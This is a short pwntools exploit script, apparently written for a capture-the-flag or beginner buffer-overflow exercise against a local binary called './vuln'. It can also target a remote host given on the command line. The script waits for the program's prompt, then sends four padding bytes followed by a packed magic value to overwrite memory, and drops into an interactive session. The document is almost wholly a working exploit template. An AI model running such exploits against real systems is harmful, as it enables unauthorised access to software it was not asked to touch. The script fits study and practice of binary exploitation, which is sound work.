from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x4006e0
continue
'''.format(**locals())

#Binary filename
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

p.recvuntil(b"lets get helloworld for bof\n")
p.sendline(b"a" * 4 + p32(0x6e756161)) 

p.interactive()
